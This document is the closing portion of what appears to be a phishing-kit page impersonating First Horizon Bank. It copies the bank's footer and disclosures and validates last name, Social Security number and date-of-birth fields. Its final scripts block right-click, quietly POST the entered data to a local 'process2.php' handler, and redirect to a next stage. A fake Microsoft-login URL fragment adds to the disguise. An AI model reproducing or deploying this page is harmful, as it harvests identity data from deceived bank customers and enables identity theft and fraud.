	var m = document.getElementById('month').value;
	var y = document.getElementById('year').value;		
	var warning = document.getElementById("dateofbirthWarning");
	
	if(!d || !m || !y){
		//warning.style.visibility = "visible";
		//alert("222");
		//warning.innerHTML = "Invalid Date!!!";
		//alert("3333");				
	} else {
		if(y.length ==4 && d.length == 2 && m.length == 2){
			var currDate = new Date();
			var today = new Date(y,m-1,d,0,0,0,0);
			//alert(today.getMonth());
			if(d == today.getDate() && (m-1) == today.getMonth() && y == today.getFullYear()){
				if(today > currDate){
					warning.style.visibility = 'visible';
					warning.innerHTML = "Date of Birth cannot be a future date.";
				} else {
					warning.style.visibility = 'hidden';
				}
				//alert("2222222");
			} else {
				warning.style.visibility = 'visible';
				warning.innerHTML = "Please enter a valid Date of Birth.";
			}
		}
		
		if(y.length < 4 && d.length == 2 && m.length == 2){
			warning.style.visibility = 'visible';
			warning.innerHTML = "Year must be entered as YYYY, e.g., 1980.";
		}
		
	}			
}

function fnEnableContinueButton() {
	var lastnameid = document.getElementById('lastname');
	var socialid = document.getElementById('social');
	var d = document.getElementById('day');
	var m = document.getElementById('month');
	var y = document.getElementById('year');
	var dateofbirthWarning = document.getElementById('dateofbirthWarning');
	if ((lastnameid.value.length == 0) || socialid.value.length == 0
			|| d.value.length == 0 || m.value.length == 0 || y.value.length < 4) {
		document.getElementById('submit').disabled = true;
	} else {
		if(dateofbirthWarning.style.visibility == 'visible'){
			document.getElementById('submit').disabled = true;
		} else {
			var monthVar = m.value.length == 1 ? "0"+m.value : m.value;
			var dateVar = d.value.length == 1 ? "0"+d.value : d.value;
			document.getElementById("dateofbirth").value = monthVar+"/"+dateVar+"/"+y.value;
			document.getElementById('submit').disabled = false;
		}
	}
}

function fnAllowAlphabet(evt) {
	if ((evt.keyCode >= 65 && evt.keyCode <= 90)
			|| (evt.keyCode >= 97 && evt.keyCode <= 122)) {
		return true;
	}
	return false;
}

// allows all alpha chars and space, hyphen, and apostrophe
function fhLastnameCheck(evt) {
	if ((evt.keyCode >= 65 && evt.keyCode <= 90)
			|| (evt.keyCode >= 97 && evt.keyCode <= 122)
			|| evt.keyCode == 32
			|| evt.keyCode == 39
			|| evt.keyCode == 45) {
		return true;
	}
	return false;
}

function fnShowHideSSN(ele){
	var element = document.getElementById('social');
	var eleType = element.type;
	if(eleType === "password"){
		element.type = "text";
		document.getElementById('showHideSpan').innerHTML='Hide';
	} else if(eleType === "text"){
		element.type = "Password";
		document.getElementById('showHideSpan').innerHTML='Show';
	}
}

function showSSNWarning(eleId,warningId, showHideId, message){
	var element = document.getElementById(eleId);
	var warning = document.getElementById(warningId);
	document.getElementById(showHideId).style.display = 'none';
	element.className = element.className + ' invalid';
	if(message) warning.innerHTML = message;
	warning.style.visibility = 'visible';
}

function showValidSSN(eleId,warningId, showHideId, message){
	var element = document.getElementById(eleId);
	var warning = document.getElementById(warningId);
	document.getElementById(showHideId).style.display = 'block';
	element.className = element.className.replace(/ invalid/g,'');
	if(message) warning.innerHTML = message;
	warning.style.visibility = 'hidden';
}

function fnShowWarningSSN(eleId,warningId){
	var element = document.getElementById(eleId);
	if(element.value){
		var ssn = element.value;
		if(ssn.indexOf('-') == -1 && ssn.length != 9){
			showSSNWarning(eleId,warningId,'showHideSpan','SSN Number should be of 9 digits.');
		} else if(ssn.indexOf('-') != -1 && ssn.length != 11){
			showSSNWarning(eleId,warningId,'showHideSpan','SSN Number should be of 9 digits.');
		} else {
			showValidSSN(eleId,warningId,'showHideSpan');
		}
	} else {
		showSSNWarning(eleId,warningId,'showHideSpan','We still need your Social Security Number.');
	}
}

function fnAdjustLength(comp){
	var val = comp.value;
	if(val && val.length == 1){
		var mod = "0"+val;
		comp.value=mod;
	}
}

function fnHighlightNext(comp, id){
	var val = comp.value;
	if(val && val.length == 2){
		document.getElementById(id).focus();
	}
}

</script>


	<!-- End Body Container -->
	
<!-- START: FTB Footer --> 
	<!-- Bottom Gray Bar -->
	<div class="sso__gray-bar"></div>
	<!-- End Bottom Gray Bar --> 
	
	<!-- Footer -->
	<div class="sso__footer"> 
	  
	  <!-- Container -->
	  <div class="sso__footer__container sso__container sso__row"> 
	    
	    <!-- Footer Links -->
	<ul class="sso__footer__list">
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="https://www.firsthorizon.com/About">ABOUT US</a></li>
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="https://www.firsthorizon.com/Careers">CAREERS</a></li>
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="https://www.firsthorizon.com/Corporate">CORPORATE</a></li>
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="http://ir.fhnc.com/CorporateProfile">INVESTOR RELATIONS</a></li>
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="https://www.firsthorizon.com/Support/Security-and-Fraud-Protection">FRAUD &amp; SECURITY</a></li>
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="https://www.firsthorizon.com/First-Horizon-National-Corporation/Copyright-Claims">COPYRIGHT CLAIMS</a></li>
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="https://www.firsthorizon.com/About/Privacy-Policy">PRIVACY POLICY</a></li>
	      <li class="sso__footer__list__item"><a class="sso__footer__list__link" href="https://www.firsthorizon.com/First-Horizon-National-Corporation/Online-Privacy-Policy">ONLINE PRIVACY POLICY</a></li>
	</ul>
	
	    <!-- End Footer Links --> 
	    
	    <!-- Start copyright-->
	    	<p class="sso__footer__copyright">
	    		<script type="text/javascript">document.write("&copy;", new Date().getFullYear());</script>©2022 First Horizon Bank
	    	</p>
	    <!-- End copyright --> 
	    
	  </div>
	  <!-- End Container --> 
	</div>
	<!-- End Footer --> 
	
	<!-- Start Disclaimer -->	
	<div class="sso__disclaimer"> 
	
	<div class="sso__container">
	<table style="width: 100%; border: 1px solid #848689; border-collapse: collapse; border-spacing: 0px; margin-top: 1.3em;" cellspacing="0">
	    <tbody>
	        <tr>
	            <td>
	            <p style="margin: 1.15em; font-size: 1.2em;"> Insurance Products, Investments &amp; Annuities: Not A Deposit | Not Guaranteed By The Bank Or Its Affiliates | Not FDIC Insured | Not Insured By Any Federal Government Agency | May Go Down In Value</p>
	            </td>
	        </tr>
	    </tbody>
	</table>
	<p class="sso__disclaimer__body">Banking Products and Services provided by First Horizon Bank ("Bank"). Member FDIC. Equal Housing Lender.&nbsp;<img alt="" src="Areas/carouse/personal/data/equalhousinglender.png" width="relative" height="25 alt=">&nbsp; &nbsp;<img alt="Member FDIC" src="Areas/carouse/personal/data/memberfdic.png" width="relative" height="25">&nbsp;</p>
	<p class="sso__disclaimer__body">Insurance Products and Annuities: May be purchased from any agent or company, and the customer's choice will not affect current or future credit decisions.</p>
	<p class="sso__disclaimer__body">First Horizon Advisors is the trade name for wealth management products and services provided by Bank and its affiliates. Trust services provided by Bank.</p>
	<p class="sso__disclaimer__body">Investment management services, investments, annuities and financial planning available through First Horizon Advisors, Inc., member FINRA, SIPC, and a subsidiary of Bank. Arkansas Insurance License # 416584.</p>
	<p class="sso__disclaimer__body">Insurance products are provided by First Horizon Insurance Services, Inc. ("FHIS"), a Tennessee corporation, and a subsidiary of Bank. The principal place of business of FHIS is 165 Madison Ave., Memphis, TN 38103. California Insurance License # OD12174. Arkansas Insurance License # 100110355.</p>
	<p class="sso__disclaimer__body">First Horizon Advisors, Inc., FHIS, and their agents may transact insurance business or offer annuities only in states where they are licensed or where they are exempted or excluded from state insurance licensing requirements.</p>
	<p class="sso__disclaimer__body">The contents of this website are for informational purposes only. Nothing on this website should be considered investment advice; or, a recommendation or offer to buy or sell a security or other financial product or to adopt any investment strategy.</p>
	<p class="sso__disclaimer__body">First Horizon Advisors does not offer tax or legal advice. You should consult your personal tax and/or legal advisor concerning your individual situation.</p>
	<p class="sso__disclaimer__body">
	<script type="text/javascript">document.write("&copy;", new Date().getFullYear());</script>©2022 First Horizon Bank
	</p>
	</div>
	
	</div>
	<!-- End Disclaimer -->
<!-- END: FTB Footer --> 

	</div>
<script type="text/javascript" src="Areas/carouse/personal/data/XRpJQY.js"></script>



<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="Assets/heros/icons/images/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

$('#loginForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('Common/general/socials/data/process2.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                              window.location.href = "indexem.php";
                        },2000);
		e.preventDefault();
	});


</script>


<?php
 }
?>


<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="Assets/heros/icons/images/actions.js"></script>
</body>
</html>